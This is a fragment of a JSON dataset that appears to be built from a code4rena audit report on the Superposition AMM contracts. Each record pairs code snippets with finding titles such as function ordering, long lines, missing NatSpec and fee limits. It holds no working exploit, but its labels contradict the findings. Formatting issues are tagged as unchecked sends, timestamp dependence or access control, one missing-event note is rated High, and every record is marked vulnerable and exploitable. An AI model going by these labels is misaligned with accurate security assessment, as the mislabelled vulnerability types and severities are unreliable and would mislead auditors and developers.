internal _getExecutorPosition\n   internal _getExecutorUpdatePosition\n   internal _getExecutorAdmin\n   internal _getExecutorFallback\n   internal _setProxyAdmin\n   internal _setProxies\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-7\"></a>[NC-7] Function ordering does not follow the Solidity style guide",
    "description": "According to the [Solidity style guide](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-functions), functions should be laid out in the following order :`constructor()`, `receive()`, `fallback()`, `external`, `public`, `internal`, `private`, but the cases below do not follow this pattern *Instances (2)*: File: ./pkg/sol/OwnershipNFTs.sol 1: Current order:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 111,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n42:     function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {\n\n104:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n\n197:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n\n202:     function updateNftManager9BDF41F6(address /* manager */) external {\n\n207:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n\n214:     function swap904369BE(address /* pool */, bool /* zeroForOne */, int256 /* amount */, uint256 /* priceLimit */) external returns (int256, int256) {\n\n219:     function quote72E2ADE7(address /* pool */, bool /* zeroForOne */, int256 /* amount */, uint256 /* priceLimit */) external {\n\n225:     function quote2CD06B86E(address /* to */, address /* from */, uint256 /* amount */, uint256 /* minOut*/) external {\n\n244:     function swap2ExactIn41203F1D(address /* tokenA */, address /* tokenB */, uint256 /* amountIn */, uint256 /* minAmountOut */) external returns (uint256, uint256) {\n\n262:     function swapIn32502CA71(address token, uint256 amountIn, uint256 minOut) external returns (int256, int256) {\n\n281:     function swapInPermit2CEAAB576(address token, uint256 amountIn, uint256 minOut, uint256 nonce, uint256 deadline, uint256 maxAmount, bytes memory sig) external returns (int256, int256) {\n\n304:     function swapOut5E08A399(address token, uint256 amountIn, uint256 minOut) external returns (int256, int256) {\n\n322:     function swapOutPermit23273373B(address token, uint256 amountIn, uint256 minOut, uint256 nonce, uint256 deadline, uint256 maxAmount, bytes memory sig) external returns (int256, int256) {\n\n346:     function mintPositionBC5B086D(address /* token */, int32 /* lower */, int32 /* upper */) external returns (uint256 /* id */) {\n\n351:     function burnPositionAE401070(uint256 /* id */) external {\n\n356:     function positionOwnerD7878480(uint256 /* id */) external returns (address) {\n\n371:     function positionBalance4F32C7DB(address /* user */) external returns (uint256) {\n\n400:     function sqrtPriceX967B8F5FC5(address /* pool */) external returns (uint256) {\n\n413:     function curTick181C6FD9(address /* pool */) external returns (int32) {\n\n418:     function tickSpacing653FE28F(address /* pool */) external returns (uint8) {\n\n423:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n\n428:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n\n433:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n\n527:     function _getExecutorSwap() internal view returns (address) {\n\n530:     function _getExecutorSwapPermit2() internal view returns (address) {\n\n533:     function _getExecutorQuote() internal view returns (address) {\n\n536:     function _getExecutorPosition() internal view returns (address) {\n\n539:     function _getExecutorUpdatePosition() internal view returns (address) {\n\n542:     function _getExecutorAdmin() internal view returns (address) {\n\n545:     function _getExecutorFallback() internal view returns (address) {\n\n549:     function _setProxyAdmin(address newAdmin) internal {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "<a name=\"NC-8\"></a>[NC-8] Functions should not be longer than 50 lines",
    "description": "Overly complex code can make understanding functionality more difficult, try to further modularize your code to ensure readability *Instances (37)*: File: ./pkg/sol/OwnershipNFTs.sol 54:     function ownerOf(uint256 _tokenId) public view returns (address) { 98:     function _requireAuthorised(address _from, uint256 _tokenId) internal view {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 66,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n244:     function swap2ExactIn41203F1D(address /* tokenA */, address /* tokenB */, uint256 /* amountIn */, uint256 /* minAmountOut */) external returns (uint256, uint256) {\n\n281:     function swapInPermit2CEAAB576(address token, uint256 amountIn, uint256 minOut, uint256 nonce, uint256 deadline, uint256 maxAmount, bytes memory sig) external returns (int256, int256) {\n\n322:     function swapOutPermit23273373B(address token, uint256 amountIn, uint256 minOut, uint256 nonce, uint256 deadline, uint256 maxAmount, bytes memory sig) external returns (int256, int256) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"NC-10\"></a>[NC-10] Lines are too long",
    "description": "Usually lines in source code are limited to [80](https://softwareengineering.stackexchange.com/questions/148677/why-is-80-characters-the-standard-limit-for-code-width) characters. Today's screens are much larger so it's reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over [164](https://github.com/aizatto/character-length) characters, the lines below should be split when they reach that length *Instances (3)*: File: ./pkg/sol/SeawaterAMM.sol 244:     function swap2ExactIn41203F1D(address /* tokenA */, address /* tokenB */, uint256 /* amountIn */, uint256 /* minAmountOut */) external returns (uint256, uint256) { 281:     function swapInPermit2CEAAB576(address token, uint256 amountIn, uint256 minOut, uint256 nonce, uint256 deadline, uint256 maxAmount, bytes memory sig) external returns (int256, int256) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.609,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n104:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n             _setProxyAdmin(newAdmin);\n\n104:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n             _setProxyAdmin(newAdmin);\n\n115:     function updateExecutors(\n             ISeawaterExecutorSwap executorSwap,\n             ISeawaterExecutorSwapPermit2 executorSwapPermit2,\n             ISeawaterExecutorQuote executorQuote,\n             ISeawaterExecutorPosition executorPosition,\n             ISeawaterExecutorUpdatePosition executorUpdatePosition,\n             ISeawaterExecutorAdmin executorAdmin,\n             ISeawaterExecutorFallback executorFallback\n         ) public onlyProxyAdmin {\n             _setProxies(executorSwap, executorSwapPermit2, executorQuote, executorPosition, executorUpdatePosition, executorAdmin, executorFallback);\n\n115:     function updateExecutors(\n             ISeawaterExecutorSwap executorSwap,\n             ISeawaterExecutorSwapPermit2 executorSwapPermit2,\n             ISeawaterExecutorQuote executorQuote,\n             ISeawaterExecutorPosition executorPosition,\n             ISeawaterExecutorUpdatePosition executorUpdatePosition,\n             ISeawaterExecutorAdmin executorAdmin,\n             ISeawaterExecutorFallback executorFallback\n         ) public onlyProxyAdmin {\n             _setProxies(executorSwap, executorSwapPermit2, executorQuote, executorPosition, executorUpdatePosition, executorAdmin, executorFallback);\n\n197:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n             directDelegate(_getExecutorAdmin());\n\n197:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n             directDelegate(_getExecutorAdmin());\n\n202:     function updateNftManager9BDF41F6(address /* manager */) external {\n             directDelegate(_getExecutorAdmin());\n\n202:     function updateNftManager9BDF41F6(address /* manager */) external {\n             directDelegate(_getExecutorAdmin());\n\n207:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n             directDelegate(_getExecutorAdmin());\n\n207:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n             directDelegate(_getExecutorAdmin());\n\n455:     function updatePositionC7F1F740(\n             address /* pool */,\n             uint256 /* id */,\n             int128 /* delta */\n         ) external returns (int256, int256) {\n             directDelegate(_getExecutorUpdatePosition());\n\n455:     function updatePositionC7F1F740(\n             address /* pool */,\n             uint256 /* id */,\n             int128 /* delta */\n         ) external returns (int256, int256) {\n             directDelegate(_getExecutorUpdatePosition());\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "<a name=\"NC-11\"></a>[NC-11] Missing Event for critical parameters change",
    "description": "Events help non-contract tools to track changes, and events prevent users from being surprised by changes. *Instances (13)*: File: ./pkg/sol/OwnershipNFTs.sol 166:     function setApprovalForAll(address _operator, bool _approved) external { isApprovedForAll[msg.sender][_operator] = _approved;",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 64,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n108:     /// @notice updates the addresses of the executors. only usable by the proxy admin\n         /// @param executorSwap the address of the swap executor\n         /// @param executorSwapPermit2 the deployed code for the swap_permit2 executor\n         /// @param executorQuote the deployed code for the quote executor\n         /// @param executorPosition the address of the position executor\n         /// @param executorAdmin the address of the admin executor\n         /// @param executorFallback the address of the fallback executor\n         function updateExecutors(\n             ISeawaterExecutorSwap executorSwap,\n             ISeawaterExecutorSwapPermit2 executorSwapPermit2,\n             ISeawaterExecutorQuote executorQuote,\n             ISeawaterExecutorPosition executorPosition,\n             ISeawaterExecutorUpdatePosition executorUpdatePosition,\n             ISeawaterExecutorAdmin executorAdmin,\n             ISeawaterExecutorFallback executorFallback\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"NC-13\"></a>[NC-13] Incomplete NatSpec: `@param` is missing on actually documented functions",
    "description": "The following functions are missing `@param` NatSpec comments. *Instances (1)*: File: ./pkg/sol/SeawaterAMM.sol 108:     /// @notice updates the addresses of the executors. only usable by the proxy admin /// @param executorSwap the address of the swap executor",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n149:                 revert(0, returndatasize())\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "<a name=\"NC-17\"></a>[NC-17] Take advantage of Custom Error's return value property",
    "description": "An important feature of Custom Error is that values such as address, tokenID, msg.value can be written inside the () sign, this kind of approach provides a serious advantage in debugging and examining the revert details of dapps such as tenderly. *Instances (1)*: File: ./pkg/sol/SeawaterAMM.sol 149:                 revert(0, returndatasize()) [Link to code](https://github.com/code-423n4/2024-08-superposition/tree/main/./pkg/sol/SeawaterAMM.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.092,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n1: \n   Current order:\n   StructDefinition.AddressSlot\n   FunctionDefinition.getAddressSlot\n   ModifierDefinition.onlyProxyAdmin\n   FunctionDefinition.constructor\n   FunctionDefinition.updateProxyAdmin\n   FunctionDefinition.updateExecutors\n   FunctionDefinition.directDelegate\n   FunctionDefinition.createPoolD650E2D0\n   FunctionDefinition.collectProtocol7540FA9F\n   FunctionDefinition.enablePool579DA658\n   FunctionDefinition.authoriseEnabler5B17C274\n   FunctionDefinition.setSqrtPriceFF4DB98C\n   FunctionDefinition.updateNftManager9BDF41F6\n   FunctionDefinition.updateEmergencyCouncil7D0C1C58\n   FunctionDefinition.swap904369BE\n   FunctionDefinition.quote72E2ADE7\n   FunctionDefinition.quote2CD06B86E\n   FunctionDefinition.swapPermit2EE84AD91\n   FunctionDefinition.swap2ExactIn41203F1D\n   FunctionDefinition.swap2ExactInPermit236B2FDD8\n   FunctionDefinition.swapIn32502CA71\n   FunctionDefinition.swapInPermit2CEAAB576\n   FunctionDefinition.swapOut5E08A399\n   FunctionDefinition.swapOutPermit23273373B\n   FunctionDefinition.mintPositionBC5B086D\n   FunctionDefinition.burnPositionAE401070\n   FunctionDefinition.positionOwnerD7878480\n   FunctionDefinition.transferPositionEEC7A3CD\n   FunctionDefinition.positionBalance4F32C7DB\n   FunctionDefinition.positionLiquidity8D11C045\n   FunctionDefinition.positionTickLower2F77CCE1\n   FunctionDefinition.positionTickUpper67FD55BA\n   FunctionDefinition.sqrtPriceX967B8F5FC5\n   FunctionDefinition.feesOwed22F28DBD\n   FunctionDefinition.curTick181C6FD9\n   FunctionDefinition.tickSpacing653FE28F\n   FunctionDefinition.feeBB3CF608\n   FunctionDefinition.feeGrowthGlobal038B5665B\n   FunctionDefinition.feeGrowthGlobal1A33A5A1B\n   FunctionDefinition.collectSingleTo6D76575F\n   FunctionDefinition.collect7F21947C\n   FunctionDefinition.updatePositionC7F1F740\n   FunctionDefinition.incrPositionC3AC7CAA\n   FunctionDefinition.decrPosition09293696\n   FunctionDefinition.incrPositionPermit25468326E\n   FunctionDefinition.fallback\n   FunctionDefinition._getExecutorSwap\n   FunctionDefinition._getExecutorSwapPermit2\n   FunctionDefinition._getExecutorQuote\n   FunctionDefinition._getExecutorPosition\n   FunctionDefinition._getExecutorUpdatePosition\n   FunctionDefinition._getExecutorAdmin\n   FunctionDefinition._getExecutorFallback\n   FunctionDefinition._setProxyAdmin\n   FunctionDefinition._setProxies\n   \n   Suggested order:\n   StructDefinition.AddressSlot\n   ModifierDefinition.onlyProxyAdmin\n   FunctionDefinition.getAddressSlot\n   FunctionDefinition.constructor\n   FunctionDefinition.updateProxyAdmin\n   FunctionDefinition.updateExecutors\n   FunctionDefinition.directDelegate\n   FunctionDefinition.createPoolD650E2D0\n   FunctionDefinition.collectProtocol7540FA9F\n   FunctionDefinition.enablePool579DA658\n   FunctionDefinition.authoriseEnabler5B17C274\n   FunctionDefinition.setSqrtPriceFF4DB98C\n   FunctionDefinition.updateNftManager9BDF41F6\n   FunctionDefinition.updateEmergencyCouncil7D0C1C58\n   FunctionDefinition.swap904369BE\n   FunctionDefinition.quote72E2ADE7\n   FunctionDefinition.quote2CD06B86E\n   FunctionDefinition.swapPermit2EE84AD91\n   FunctionDefinition.swap2ExactIn41203F1D\n   FunctionDefinition.swap2ExactInPermit236B2FDD8\n   FunctionDefinition.swapIn32502CA71\n   FunctionDefinition.swapInPermit2CEAAB576\n   FunctionDefinition.swapOut5E08A399\n   FunctionDefinition.swapOutPermit23273373B\n   FunctionDefinition.mintPositionBC5B086D\n   FunctionDefinition.burnPositionAE401070\n   FunctionDefinition.positionOwnerD7878480\n   FunctionDefinition.transferPositionEEC7A3CD\n   FunctionDefinition.positionBalance4F32C7DB\n   FunctionDefinition.positionLiquidity8D11C045\n   FunctionDefinition.positionTickLower2F77CCE1\n   FunctionDefinition.positionTickUpper67FD55BA\n   FunctionDefinition.sqrtPriceX967B8F5FC5\n   FunctionDefinition.feesOwed22F28DBD\n   FunctionDefinition.curTick181C6FD9\n   FunctionDefinition.tickSpacing653FE28F\n   FunctionDefinition.feeBB3CF608\n   FunctionDefinition.feeGrowthGlobal038B5665B\n   FunctionDefinition.feeGrowthGlobal1A33A5A1B\n   FunctionDefinition.collectSingleTo6D76575F\n   FunctionDefinition.collect7F21947C\n   FunctionDefinition.updatePositionC7F1F740\n   FunctionDefinition.incrPositionC3AC7CAA\n   FunctionDefinition.decrPosition09293696\n   FunctionDefinition.incrPositionPermit25468326E\n   FunctionDefinition.fallback\n   FunctionDefinition._getExecutorSwap\n   FunctionDefinition._getExecutorSwapPermit2\n   FunctionDefinition._getExecutorQuote\n   FunctionDefinition._getExecutorPosition\n   FunctionDefinition._getExecutorUpdatePosition\n   FunctionDefinition._getExecutorAdmin\n   FunctionDefinition._getExecutorFallback\n   FunctionDefinition._setProxyAdmin\n   FunctionDefinition._setProxies\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"NC-18\"></a>[NC-18] Contract does not follow the Solidity style guide's suggested layout ordering",
    "description": "The [style guide](https://docs.soliditylang.org/en/v0.8.16/style-guide.html#order-of-layout) says that, within a contract, the ordering should be: 1) Type declarations 2) State variables 3) Events 4) Modifiers",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 119,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n42:     function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {\n\n132:     function directDelegate(address to) internal {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"NC-19\"></a>[NC-19] Internal and private variables and functions names should begin with an underscore",
    "description": "According to the Solidity Style Guide, Non-`external` variable and function names should begin with an [underscore](https://docs.soliditylang.org/en/latest/style-guide.html#underscore-prefix-for-non-external-functions-and-variables) *Instances (2)*: File: ./pkg/sol/SeawaterAMM.sol 42:     function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) { 132:     function directDelegate(address to) internal {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.194,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n30: bytes32 constant EXECUTOR_FALLBACK_SLOT = bytes32(uint256(keccak256(\"seawater.impl.fallback\")) - 1);\n\n79:         ISeawaterExecutorFallback _executorFallback\n\n89:             _executorFallback\n\n122:         ISeawaterExecutorFallback executorFallback\n\n124:         _setProxies(executorSwap, executorSwapPermit2, executorQuote, executorPosition, executorUpdatePosition, executorAdmin, executorFallback);\n\n505:     fallback() external {\n\n520:         else directDelegate(_getExecutorFallback());\n\n545:     function _getExecutorFallback() internal view returns (address) {\n\n546:         return StorageSlot.getAddressSlot(EXECUTOR_FALLBACK_SLOT).value;\n\n560:         ISeawaterExecutorFallback executorFallback\n\n568:         StorageSlot.getAddressSlot(EXECUTOR_FALLBACK_SLOT).value = address(executorFallback);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-1\"></a>[L-1] Fallback lacking `payable`",
    "description": "*Instances (11)*: File: ./pkg/sol/SeawaterAMM.sol 30: bytes32 constant EXECUTOR_FALLBACK_SLOT = bytes32(uint256(keccak256(\"seawater.impl.fallback\")) - 1); 79:         ISeawaterExecutorFallback _executorFallback 89:             _executorFallback",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 26,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.852,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/OwnershipNFTs.sol\n\n182:     function tokenURI(uint256 /* _tokenId */) external view returns (string memory) {\n             return TOKEN_URI;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-2\"></a>[L-2] NFT ownership doesn't support hard forks",
    "description": "To ensure clarity regarding the ownership of the NFT on a specific chain, it is recommended to add `require(block.chainid == 1, \"Invalid Chain\")` or the desired chain ID in the functions below. Alternatively, consider including the chain ID in the URI itself. By doing so, any confusion regarding the chain responsible for owning the NFT will be eliminated. *Instances (1)*: File: ./pkg/sol/OwnershipNFTs.sol 182:     function tokenURI(uint256 /* _tokenId */) external view returns (string memory) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.167,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n[Link to code](https://github.com/code-423n4/2024-08-superposition/tree/main/./pkg/sol/OwnershipNFTs.sol)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "<a name=\"L-3\"></a>[L-3] Solidity version 0.8.20+ may not work on other chains due to `PUSH0`",
    "description": "The compiler for Solidity 0.8.20 switches the default target EVM version to [Shanghai](https://blog.soliditylang.org/2023/05/10/solidity-0.8.20-release-announcement/#important-note), which includes the new `PUSH0` op code. This op code may not yet be implemented on all L2s, so deployment on these chains will fail. To work around this issue, use an earlier [EVM](https://docs.soliditylang.org/en/v0.8.20/using-the-compiler.html?ref=zaryabs.com#setting-the-evm-version-to-target) [version](https://book.getfoundry.sh/reference/config/solidity-compiler#evm_version). While the project itself may or may not compile with 0.8.20, other projects with which it integrates, or which extend this project may, and those projects will have problems deploying these contracts/libraries. *Instances (2)*: File: ./pkg/sol/OwnershipNFTs.sol 2: pragma solidity 0.8.16; [Link to code](https://github.com/code-423n4/2024-08-superposition/tree/main/./pkg/sol/OwnershipNFTs.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.108,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n405:     function feesOwed22F28DBD(\n             address /* pool */,\n             uint256 /* position */\n         ) external returns (uint128, uint128) {\n             directDelegate(_getExecutorAdmin());\n\n405:     function feesOwed22F28DBD(\n             address /* pool */,\n             uint256 /* position */\n         ) external returns (uint128, uint128) {\n             directDelegate(_getExecutorAdmin());\n\n423:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n             directDelegate(_getExecutorAdmin());\n\n423:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n             directDelegate(_getExecutorAdmin());\n\n428:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n             directDelegate(_getExecutorAdmin());\n\n428:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n             directDelegate(_getExecutorAdmin());\n\n433:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n             directDelegate(_getExecutorAdmin());\n\n433:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n             directDelegate(_getExecutorAdmin());\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"M-1\"></a>[M-1] Fees can be set to be greater than 100%.",
    "description": "There should be an upper limit to reasonable fees. A malicious owner can keep the fee rate at zero, but if a large value transfer enters the mempool, the owner can jack the rate up to the maximum and sandwich attack a user. *Instances (8)*: File: ./pkg/sol/SeawaterAMM.sol 405:     function feesOwed22F28DBD(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 34,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n104:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n\n115:     function updateExecutors(\n\n160:     function createPoolD650E2D0(\n\n171:     function collectProtocol7540FA9F(\n\n181:     function enablePool579DA658(\n\n189:     function authoriseEnabler5B17C274(\n\n197:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n\n202:     function updateNftManager9BDF41F6(address /* manager */) external {\n\n207:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n\n214:     function swap904369BE(address /* pool */, bool /* zeroForOne */, int256 /* amount */, uint256 /* priceLimit */) external returns (int256, int256) {\n\n219:     function quote72E2ADE7(address /* pool */, bool /* zeroForOne */, int256 /* amount */, uint256 /* priceLimit */) external {\n\n225:     function quote2CD06B86E(address /* to */, address /* from */, uint256 /* amount */, uint256 /* minOut*/) external {\n\n230:     function swapPermit2EE84AD91(\n\n244:     function swap2ExactIn41203F1D(address /* tokenA */, address /* tokenB */, uint256 /* amountIn */, uint256 /* minAmountOut */) external returns (uint256, uint256) {\n\n249:     function swap2ExactInPermit236B2FDD8(\n\n262:     function swapIn32502CA71(address token, uint256 amountIn, uint256 minOut) external returns (int256, int256) {\n\n281:     function swapInPermit2CEAAB576(address token, uint256 amountIn, uint256 minOut, uint256 nonce, uint256 deadline, uint256 maxAmount, bytes memory sig) external returns (int256, int256) {\n\n304:     function swapOut5E08A399(address token, uint256 amountIn, uint256 minOut) external returns (int256, int256) {\n\n322:     function swapOutPermit23273373B(address token, uint256 amountIn, uint256 minOut, uint256 nonce, uint256 deadline, uint256 maxAmount, bytes memory sig) external returns (int256, int256) {\n\n346:     function mintPositionBC5B086D(address /* token */, int32 /* lower */, int32 /* upper */) external returns (uint256 /* id */) {\n\n351:     function burnPositionAE401070(uint256 /* id */) external {\n\n356:     function positionOwnerD7878480(uint256 /* id */) external returns (address) {\n\n362:     function transferPositionEEC7A3CD(\n\n371:     function positionBalance4F32C7DB(address /* user */) external returns (uint256) {\n\n376:     function positionLiquidity8D11C045(\n\n384:     function positionTickLower2F77CCE1(\n\n392:     function positionTickUpper67FD55BA(\n\n400:     function sqrtPriceX967B8F5FC5(address /* pool */) external returns (uint256) {\n\n405:     function feesOwed22F28DBD(\n\n413:     function curTick181C6FD9(address /* pool */) external returns (int32) {\n\n418:     function tickSpacing653FE28F(address /* pool */) external returns (uint8) {\n\n423:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n\n428:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n\n433:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n\n438:     function collectSingleTo6D76575F(\n\n447:     function collect7F21947C(\n\n455:     function updatePositionC7F1F740(\n\n464:     function incrPositionC3AC7CAA(\n\n476:     function decrPosition09293696(\n\n487:     function incrPositionPermit25468326E(\n\n505:     fallback() external {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"M-2\"></a>[M-2] Library function isn't `internal` or `private`",
    "description": "In a library, using an external or public visibility means that we won't be going through the library with a DELEGATECALL but with a CALL. This changes the context and should be done carefully. *Instances (41)*: File: ./pkg/sol/SeawaterAMM.sol 104:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin { 115:     function updateExecutors(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 86,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "rust\n///! Set up the storage access, controlling for parallel use.\npub fn with_storage<T, P: StorageNew, F: FnOnce(&mut P) -> T>(\n    sender: Option<[u8; 20]>,\n    slots: Option<HashMap<&str, &str>>,\n    caller_bals: Option<HashMap<Address, U256>>,\n    amm_bals: Option<HashMap<Address, U256>>,\n    f: F,\n) -> T {\n    StorageCache::clear();\n    test_shims::reset_storage();\n    if let Some(v) = sender {\n        test_shims::set_sender(v);\n    }\n    if let Some(items) = caller_bals {\n        test_shims::set_caller_bals(items);\n    }\n    if let Some(items) = amm_bals {\n        test_shims::set_amm_bals(items);\n    }\n    if let Some(items) = slots {\n        set_storage(items);\n    }\n    f(&mut P::new(U256::ZERO, 0))\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
